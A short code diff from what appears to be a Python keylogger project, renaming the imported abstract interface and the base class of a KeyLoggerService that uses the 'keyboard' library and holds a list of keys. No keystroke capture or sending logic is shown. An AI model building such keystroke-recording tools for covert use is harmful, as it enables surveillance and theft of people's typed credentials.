@@ -1,8 +1,8 @@
-from ikeylogger_service import AbstractKeyLoggerService
+from I_key_logger_service import IKeyLoggerService
 import keyboard
 
 
-class KeyLoggerService(AbstractKeyLoggerService):
+class KeyLoggerService(IKeyLoggerService):
 
     def __init__(self):
         self.keys = []
